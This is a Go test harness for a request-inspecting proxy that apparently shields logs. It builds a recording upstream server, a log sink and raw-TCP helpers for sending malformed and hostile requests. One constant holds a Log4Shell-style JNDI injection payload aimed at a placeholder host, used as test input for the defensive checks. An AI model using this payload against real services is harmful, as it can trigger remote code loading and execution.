package proxy

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/TurlaFSB/logshield/internal/engine"
)

// seen is one request as the upstream received it.
type seen struct {
	Method        string
	RequestURI    string
	Host          string
	Header        http.Header
	Body          []byte
	TE            []string
	ContentLength int64
	Proto         string
}

// upstream is a test backend that records every request it receives.
type upstream struct {
	*httptest.Server
	mu   sync.Mutex
	reqs []seen
	// handler, if set, writes the response.
	handler http.HandlerFunc
}

func newUpstream(t *testing.T) *upstream {
	t.Helper()
	u := &upstream{}
	u.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		u.mu.Lock()
		u.reqs = append(u.reqs, seen{
			Method: r.Method, RequestURI: r.RequestURI, Host: r.Host, Header: r.Header.Clone(), Body: body,
			TE: r.TransferEncoding, ContentLength: r.ContentLength, Proto: r.Proto,
		})
		h := u.handler
		u.mu.Unlock()
		if h != nil {
			h(w, r)
			return
		}
		w.Header().Set("X-Upstream", "yes")
		_, _ = io.WriteString(w, "ok")
	}))
	t.Cleanup(u.Close)
	return u
}

func (u *upstream) received() []seen {
	u.mu.Lock()
	defer u.mu.Unlock()
	return append([]seen(nil), u.reqs...)
}

func (u *upstream) count() int { return len(u.received()) }

func (u *upstream) url(t *testing.T) *url.URL {
	t.Helper()
	parsed, err := url.Parse(u.URL)
	if err != nil {
		t.Fatal(err)
	}
	return parsed
}

// logSink collects JSON log lines.
type logSink struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (l *logSink) Write(p []byte) (int, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.buf.Write(p)
}

func (l *logSink) String() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.buf.String()
}

func (l *logSink) records(t *testing.T) []map[string]any {
	t.Helper()
	lines := strings.Split(strings.TrimSpace(l.String()), "\n")
	out := make([]map[string]any, 0, len(lines))
	for _, line := range lines {
		if line == "" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			t.Fatalf("log line is not JSON: %q: %v", line, err)
		}
		out = append(out, m)
	}
	return out
}

// harness is a proxy in front of an upstream, served by a real net/http server.
type harness struct {
	t      *testing.T
	up     *upstream
	proxy  *Proxy
	server *httptest.Server
	logs   *logSink

	mu       sync.Mutex
	events   []Event
	inspects []engine.Request
}

func newHarness(t *testing.T, mutate func(*Config)) *harness {
	t.Helper()
	h := &harness{t: t, up: newUpstream(t), logs: &logSink{}}
	cfg := Config{
		Upstream: h.up.url(t),
		Logger:   slog.New(slog.NewJSONHandler(h.logs, &slog.HandlerOptions{Level: slog.LevelDebug})),
		Observer: ObserverFunc(func(e Event) {
			h.mu.Lock()
			h.events = append(h.events, e)
			h.mu.Unlock()
		}),
	}
	if mutate != nil {
		mutate(&cfg)
	}
	p, err := New(cfg)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	// Record exactly what the engine is asked to inspect.
	real := p.inspect
	p.inspect = func(r engine.Request, c engine.Config) engine.Verdict {
		h.mu.Lock()
		h.inspects = append(h.inspects, r)
		h.mu.Unlock()
		return real(r, c)
	}
	h.proxy = p
	h.server = httptest.NewUnstartedServer(p)
	h.server.Listener = p.WrapListener(h.server.Listener)
	h.server.Start()
	t.Cleanup(h.server.Close)
	return h
}

func (h *harness) addr() string { return strings.TrimPrefix(h.server.URL, "http://") }

func (h *harness) lastEvent() Event {
	h.t.Helper()
	h.mu.Lock()
	defer h.mu.Unlock()
	if len(h.events) == 0 {
		h.t.Fatal("no event recorded")
	}
	return h.events[len(h.events)-1]
}

func (h *harness) eventCount() int {
	h.mu.Lock()
	defer h.mu.Unlock()
	return len(h.events)
}

func (h *harness) allEvents() []Event {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]Event(nil), h.events...)
}

func (h *harness) inspected() []engine.Request {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]engine.Request(nil), h.inspects...)
}

// reply is a parsed HTTP response.
type reply struct {
	Status int
	Header http.Header
	Body   string
}

// raw sends bytes to the proxy over a fresh TCP connection and reads one
// response. It is how hostile and malformed requests are sent, since Go's HTTP
// client refuses to produce them.
func (h *harness) raw(payload string) reply {
	h.t.Helper()
	rs := h.rawAll(payload, 1)
	if len(rs) == 0 {
		h.t.Fatalf("no response to %q", payload)
	}
	return rs[0]
}

// rawAll sends payload and reads up to n responses.
func (h *harness) rawAll(payload string, n int) []reply {
	h.t.Helper()
	conn := dial(h.t, h.addr())
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := io.WriteString(conn, payload); err != nil {
		h.t.Fatal(err)
	}
	br := bufio.NewReader(conn)
	var out []reply
	for i := 0; i < n; i++ {
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			break
		}
		body, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		out = append(out, reply{Status: resp.StatusCode, Header: resp.Header, Body: string(body)})
	}
	return out
}

// get sends a well-formed request through Go's client.
func (h *harness) do(method, target string, header http.Header, body io.Reader) reply {
	h.t.Helper()
	req, err := http.NewRequestWithContext(context.Background(), method, h.server.URL, body)
	if err != nil {
		h.t.Fatal(err)
	}
	req.URL.Opaque = target // send the target exactly as given
	for k, v := range header {
		req.Header[k] = v
	}
	client := &http.Client{Timeout: 5 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := client.Do(req)
	if err != nil {
		h.t.Fatal(err)
	}
	defer func() { _ = resp.Body.Close() }()
	b, _ := io.ReadAll(resp.Body)
	return reply{Status: resp.StatusCode, Header: resp.Header, Body: string(b)}
}

// dial opens a TCP connection with a timeout.
func dial(t *testing.T, addr string) net.Conn {
	t.Helper()
	d := net.Dialer{Timeout: 2 * time.Second}
	conn, err := d.DialContext(context.Background(), "tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	return conn
}

const attack = "${jndi:ldap://x.invalid/a}"

func rawGET(target string, headers ...string) string {
	var b strings.Builder
	b.WriteString("GET " + target + " HTTP/1.1\r\nHost: app.example.com\r\n")
	for _, h := range headers {
		b.WriteString(h + "\r\n")
	}
	b.WriteString("Connection: close\r\n\r\n")
	return b.String()
}
